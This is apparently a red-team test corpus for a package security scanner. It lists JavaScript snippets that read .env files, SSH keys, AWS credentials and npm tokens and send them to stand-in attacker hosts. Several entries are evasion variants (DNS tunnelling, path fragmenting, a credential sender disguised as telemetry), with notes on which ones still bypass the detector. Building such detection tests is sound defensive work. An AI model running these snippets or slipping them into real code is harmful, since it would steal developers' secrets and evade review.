// red-team/corpus/credential-exfil.js
// Credential / secret harvesting + exfiltration payloads.

module.exports = [
  {
    id: 'exfil-dotenv-fetch',
    category: 'credential-exfil',
    technique: 'env-file-read-network',
    severity: 'CRITICAL',
    expected: 'BLOCK',
    description: 'Reads .env from disk and ships it to a hardcoded host',
    code: `
      const fs = require('fs');
      const secrets = fs.readFileSync('.env', 'utf8');
      fetch('https://evil.example/collect', { method: 'POST', body: secrets });
      module.exports = {};
    `,
  },
  {
    id: 'exfil-ssh-key',
    category: 'credential-exfil',
    technique: 'ssh-private-key-theft',
    severity: 'CRITICAL',
    expected: 'BLOCK',
    description: 'Reads the id_rsa private key and exfiltrates it',
    code: `
      const fs = require('fs');
      const key = fs.readFileSync(process.env.HOME + '/.ssh/id_rsa', 'utf8');
      require('https').request({ hostname: 'c2.example', path: '/k?d=' + encodeURIComponent(key) }).end();
      module.exports = {};
    `,
  },
  {
    id: 'exfil-aws-credentials',
    category: 'credential-exfil',
    technique: 'aws-credentials-theft',
    severity: 'CRITICAL',
    expected: 'BLOCK',
    description: 'Reads ~/.aws/credentials and posts it out',
    code: `
      const fs = require('fs');
      const creds = fs.readFileSync(require('os').homedir() + '/.aws/credentials', 'utf8');
      require('https').get('https://exfil.example/a?d=' + Buffer.from(creds).toString('base64'));
      module.exports = {};
    `,
  },
  {
    id: 'exfil-npmrc-whole',
    category: 'credential-exfil',
    technique: 'npmrc-whole-file-exfil',
    severity: 'CRITICAL',
    expected: 'BLOCK',
    description: 'Reads the whole .npmrc and ships it to a hardcoded host (no token field ever named)',
    code: `
      const fs = require('fs');
      const t = fs.readFileSync(require('os').homedir() + '/.npmrc', 'utf8');
      fetch('http://evil.example/c?d=' + t);
      module.exports = {};
    `,
  },
  {
    id: 'exfil-npmrc-token-host',
    category: 'credential-exfil',
    technique: 'npmrc-authtoken-host-override',
    severity: 'CRITICAL',
    expected: 'BLOCK',
    description: 'Extracts _authToken from .npmrc and redirects it via an explicit {host:...} override',
    code: `
      const fs = require('fs');
      const cfg = fs.readFileSync(require('os').homedir() + '/.npmrc', 'utf8');
      const m = cfg.match(/_authToken=(.+)/);
      require('https').request({ host: 'evil.example', path: '/c' }).end(m[1]);
      module.exports = {};
    `,
  },
  {
    id: 'exfil-oneline-chain',
    category: 'credential-exfil',
    technique: 'oneline-require-readfile-chain',
    severity: 'CRITICAL',
    expected: 'BLOCK',
    description: 'One-line require(fs).readFileSync(.env) chained credential theft',
    code: `
      const s = require('fs').readFileSync('.env');
      require('https').get('http://x.example/?d=' + s);
      module.exports = {};
    `,
  },

  // ── By-design WARN (policy, not a block) ────────────────────────────────────
  {
    id: 'exfil-env-token-network',
    category: 'credential-exfil',
    technique: 'process-env-token-network',
    severity: 'WARN',
    expected: 'PASS',
    description: 'process.env token + network call. By F-16 policy this is WARN/OBSERVE, not a hard block — a bare env read is indistinguishable from normal config use. Logged, not quarantined.',
    code: `
      const token = process.env.NPM_TOKEN || process.env.GITHUB_TOKEN;
      require('https').request({ hostname: 'c2.example', path: '/exfil?t=' + token });
      module.exports = {};
    `,
  },

  // ── Evasion variants ────────────────────────────────────────────────────────
  {
    id: 'exfil-dns-tunnel',
    category: 'credential-exfil',
    technique: 'dns-exfil-channel',
    severity: 'CRITICAL',
    expected: 'BLOCK',
    knownBypass: false, // closed: dns.resolve added to NETWORK_EGRESS (Phase 2)
    description: 'Reads .env then exfiltrates over DNS (dns.resolve), which is not in the NETWORK_EGRESS signal set — so CREDENTIAL_EXFILTRATION never fires',
    code: `
      const fs = require('fs');
      const dns = require('dns');
      const data = fs.readFileSync('.env', 'utf8');
      dns.resolve(Buffer.from(data).toString('hex').slice(0, 60) + '.evil.example', () => {});
      module.exports = {};
    `,
  },
  {
    id: 'exfil-concat-path',
    category: 'credential-exfil',
    technique: 'concat-credential-path-evasion',
    severity: 'CRITICAL',
    expected: 'BLOCK',
    knownBypass: true,
    description: 'Credential path assembled from fragments so the SENSITIVE_PATH regex never matches the literal. CLOSED under FW_ENABLE_AST=1 (Phase 3, opt-in): the array-join is folded and the resulting path re-matched against SENSITIVE_PATH — see `npm run redteam:ast`.',
    code: `
      const fs = require('fs');
      const p = ['/.ss', 'h/id_', 'rsa'].join('');
      const key = fs.readFileSync(process.env.HOME + p, 'utf8');
      fetch('https://evil.example/k', { method: 'POST', body: key });
      module.exports = {};
    `,
  },
  {
    id: 'krc-function-indirection-exfil',
    category: 'credential-exfil',
    technique: 'function-indirection-evasion',
    severity: 'CRITICAL',
    expected: 'BLOCK',
    knownBypass: true,
    description: 'F-1.1: the credential read and the network egress are the literal same signals as exfil-aws-credentials, unchanged, un-obfuscated -- just moved into two separate ordinary named functions with unrelated filler functions between their definitions, wired together by a third caller. CORRELATION_MAX_SEPARATORS (statement/line boundaries) is exceeded between the two signal positions, so the CREDENTIAL_EXFILTRATION structural-proximity check never fires; verified NOT closed by FW_ENABLE_AST=1 either (see `npm run redteam:ast`) -- this is not an obfuscation/resolution gap the AST tier fold-and-re-match model addresses at all, since neither signal is disguised. Architectural: the default correlation model is text-proximity within a bounded window, not interprocedural/call-graph analysis. See docs/THREAT-COVERAGE.md "Known bypasses" for the disclosed limitation and docs/THREAT-COVERAGE.md roadmap for the tracked P2 follow-up (bounded one-hop AST function correlation).',
    code: `
      const fs = require('fs');
      const https = require('https');

      function readCredentials() {
        return fs.readFileSync(process.env.HOME + '/.aws/credentials', 'utf8');
      }

      function noop1() { return 1 + 1; }
      function noop2() { return 2 + 2; }
      function noop3() { return 3 + 3; }
      function noop4() { return 4 + 4; }
      function noop5() { return 5 + 5; }
      function noop6() { return 6 + 6; }
      function noop7() { return 7 + 7; }
      function noop8() { return 8 + 8; }

      function reportUsageStats(payload) {
        const req = https.request({ hostname: 'telemetry.example-attacker.com', path: '/collect', method: 'POST' });
        req.end(payload);
      }

      module.exports = function run() {
        const creds = readCredentials();
        reportUsageStats(creds);
      };
    `,
  },
];
